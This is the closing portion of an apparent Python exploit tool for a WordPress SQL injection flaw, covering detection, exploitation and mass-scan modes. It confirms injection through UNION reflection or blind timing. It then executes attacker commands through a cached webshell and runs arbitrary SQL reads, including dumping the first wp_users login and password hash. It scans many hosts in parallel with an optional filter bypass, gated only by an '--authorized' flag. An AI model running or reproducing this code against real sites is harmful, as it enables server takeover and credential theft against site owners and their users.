                   cookies=args.cookies, bypass=args.bypass)

        if args.cleanup:
            try:
                _, _, output = t.exploit(args.command, cleanup=True)
            except (RuntimeError, urllib.error.URLError) as e:
                print("[-] cleanup failed: %s" % e); return 2
            print("[+] %s" % output); return 0

        # Reuse fast-path: a cached webshell for this target means we can skip the
        # detection round-trip entirely and go straight to a single reuse request.
        # Normalize first so the state key matches the one exploit() saves under
        # (post http->https / apex->www redirect).
        t._normalize_base()
        cached = (not args.fresh) and bool(t._load_state().get("route"))
        if not cached:
            # auto/union: prefer UNION reflection (real data, one request); fall back to
            # the blind timing oracle when reflection is blocked (unless union is forced).
            if args.method in ("auto", "union") and t._union_confirms():
                print("[+] vulnerable (UNION reflection confirmed)")
            elif args.method == "union":
                print("[-] union reflection failed (not vulnerable or blocked)"); return 1
            else:
                try:
                    det = t.detect(rounds=args.rounds)
                except urllib.error.URLError as e:
                    print("[-] %s" % e.reason); return 2
                if not det["vulnerable"]:
                    print("[-] not vulnerable"); return 1
                print("[+] vulnerable (blind SQLi: %.3fs / %.3fs)" % (det["fast"], det["slow"]))
        try:
            user, pw, output = t.exploit(args.command, fresh=args.fresh)
        except (RuntimeError, urllib.error.URLError) as e:
            print("[-] exploit failed: %s" % e); return 2
        print("[+] RCE output:\n")
        print(output, end="")
        return 0

    # -- standalone UNION proof mode (--method union, single target, no -c) ----
    if args.method == "union" and not args.file:
        if not args.url:
            p.error("--method union requires a target URL")
        url = args.url if "://" in args.url else "http://" + args.url
        if not is_local(url) and not args.authorized:
            p.error("--method union on remote targets requires --authorized")
        delivery = "json" if args.delivery == "auto" else args.delivery
        t = Target(url, timeout=args.timeout, proxy=args.proxy,
                   route=args.route, delivery=delivery, headers=hdrs,
                   cookies=args.cookies, bypass=args.bypass)
        t.union = True
        reads = {"@@version": "SELECT @@version",
                 "current_user()": "SELECT CURRENT_USER()",
                 "database()": "SELECT DATABASE()",
                 "user:pass": "SELECT CONCAT_WS(0x3a,user_login,user_pass) "
                              "FROM wp_users ORDER BY ID LIMIT 1"}
        try:
            confirmed = t._union_confirms()
        except urllib.error.URLError as e:
            print("[-] %s" % e.reason); return 2
        if not confirmed:
            print("[-] union reflection failed (not vulnerable or blocked)")
            return 1
        print("[+] vulnerable (UNION reflection confirmed)")
        out = {}
        for label, expr in reads.items():
            try:
                out[label] = t.read_union(expr)
            except Exception as e:
                out[label] = "<error: %s>" % e
        if args.json:
            print(json.dumps({"target": url, "union_proof": out}, indent=2))
        else:
            for k, v in out.items():
                print("    %-16s = %s" % (k, v))
        return 0

    # -- --sql mode: arbitrary UNION read ------------------------------------
    if args.sql:
        if not args.url:
            p.error("--sql requires a target URL")
        url = args.url if "://" in args.url else "http://" + args.url
        if not is_local(url) and not args.authorized:
            p.error("--sql on remote targets requires --authorized")
        delivery = "json" if args.delivery == "auto" else args.delivery
        t = Target(url, timeout=max(args.timeout, 30), proxy=args.proxy,
                   sleep=args.sleep, route=args.route, delivery=delivery, headers=hdrs,
                   cookies=args.cookies, bypass=args.bypass)
        t.union = True
        try:
            confirmed = t._union_confirms()
        except urllib.error.URLError as e:
            print("[-] %s" % e.reason); return 2
        if not confirmed:
            print("[-] union reflection failed (not vulnerable or blocked)")
            return 1
        print("[+] vulnerable (UNION reflection confirmed), executing query ...")
        try:
            result = t.read_union(args.sql)
        except Exception as e:
            print("[-] query failed: %s" % e); return 2
        print(result)
        return 0

    # -- detection mode (default) ---------------------------------------------
    targets = []
    if args.file:
        with open(args.file) as fh:
            targets = [ln.strip() for ln in fh
                       if ln.strip() and not ln.strip().startswith("#")]
    if args.url:
        targets.insert(0, args.url)
    if not targets:
        p.error("provide a target URL or -f hosts.txt")

    remote = [u for u in targets if not is_local(u)]
    if remote and not args.authorized:
        sys.stderr.write(
            "refusing remote targets without --authorized.\n"
            "Only test assets you own or are explicitly authorized to test.\n"
            "Affected remote targets: %s\n" % ", ".join(remote))
        return 2

    def prep(u):
        return u if "://" in u else "http://" + u

    def work(idx, u):
        try:
            rec, _ = scan_one(prep(u), args)
        except Exception as e:                       # one bad host must never kill the run
            rec = {"target": prep(u), "status": "error", "error": repr(e)}
        return idx, rec

    total = len(targets)
    workers = max(1, min(args.threads, total))
    results = [None] * total
    lock = threading.Lock()
    done = [0]

    def emit(idx, rec):
        results[idx] = rec
        with lock:
            done[0] += 1
            if args.json:
                sys.stderr.write("\r  scanned %d/%d" % (done[0], total)); sys.stderr.flush()
            else:
                pfx = "[%d/%d] " % (done[0], total) if total > 1 else ""
                print(pfx + human(rec), flush=True)

    if workers == 1:
        for i, u in enumerate(targets):
            emit(*work(i, u))
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(work, i, u) for i, u in enumerate(targets)]
            try:
                for fut in concurrent.futures.as_completed(futs):
                    emit(*fut.result())
            except KeyboardInterrupt:
                sys.stderr.write("\ninterrupted -- cancelling pending scans\n")
                ex.shutdown(wait=False, cancel_futures=True)

    results = [r for r in results if r is not None]
    if args.json:
        sys.stderr.write("\n")
        print(json.dumps(results, indent=2))

    c = Counter(r["status"] for r in results)
    sys.stderr.write("\nsummary: %d scanned | vulnerable=%d  affected_version=%d  "
                     "not_vulnerable=%d  error=%d\n" % (
                         len(results), c.get("vulnerable", 0), c.get("affected_version", 0),
                         c.get("not_vulnerable", 0), c.get("error", 0)))

    # exit 0 if any host needs attention (actively vulnerable or affected version),
    # else 1 (all clear), else 2 (all errored)
    if any(r["status"] in ("vulnerable", "affected_version") for r in results):
        return 0
    if results and all(r["status"] == "error" for r in results):
        return 2
    return 1


if __name__ == "__main__":
    sys.exit(main())
